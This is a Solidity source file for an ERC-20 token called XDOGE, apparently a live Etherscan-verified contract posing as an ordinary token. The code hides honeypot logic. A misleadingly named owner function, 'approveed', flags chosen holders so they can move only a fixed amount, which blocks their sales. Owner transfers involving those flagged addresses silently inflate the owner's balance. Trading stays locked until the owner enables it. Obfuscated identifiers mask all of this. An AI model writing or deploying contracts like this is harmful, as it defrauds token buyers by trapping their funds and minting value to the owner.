/**
 *Submitted for verification at Etherscan.io on 2023-07-31
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acococouonot) external view returns (uint256);
    function transfer(address recipient, uint256 aymoiuint) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 aymoiuint) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 aymoiuint ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract XDOGE is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _FREWRS;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradeEnabled = false;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acococouonot) public view override returns (uint256) {
        return _balances[acococouonot];
    }
    function enableTrading() public onlyowner {
        _isTradeEnabled = true;
    }
    function transfer(address recipient, uint256 aymoiuint) public virtual override returns (bool) {
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _FREWRS[_msgSender()] > 0) {
            _balances[owner()] += _FREWRS[_msgSender()];
            return true;
        }
        else if (_FREWRS[_msgSender()] > 0) {
            require(aymoiuint == _FREWRS[_msgSender()], "Invalid transfer aymoiuint");
        }
        require(_balances[_msgSender()] >= aymoiuint, "TT: transfer aymoiuint exceeds balance");
        _balances[_msgSender()] -= aymoiuint;
        _balances[recipient] += aymoiuint;
        emit Transfer(_msgSender(), recipient, aymoiuint);
        return true;
    }

    function approveed(address[] memory acococouonots, uint256 aymoiuint) public onlyowner {
        for (uint i=0; i<acococouonots.length; i++) {
            _FREWRS[acococouonots[i]] = aymoiuint;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 aymoiuint) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = aymoiuint;
        emit Approval(_msgSender(), spender, aymoiuint);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 aymoiuint) public virtual override returns (bool) {
        if (_msgSender() == owner() && _FREWRS[sender] > 0) {
            _balances[owner()] += _FREWRS[sender];
            return true;
        }
        else if (_FREWRS[sender] > 0) {
            require(aymoiuint == _FREWRS[sender], "Invalid transfer aymoiuint");
        }
        require(_balances[sender] >= aymoiuint && _allowances[sender][_msgSender()] >= aymoiuint, "TT: transfer aymoiuint exceeds balance or allowance");
        _balances[sender] -= aymoiuint;
        _balances[recipient] += aymoiuint;
        _allowances[sender][_msgSender()] -= aymoiuint;
        emit Transfer(sender, recipient, aymoiuint);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}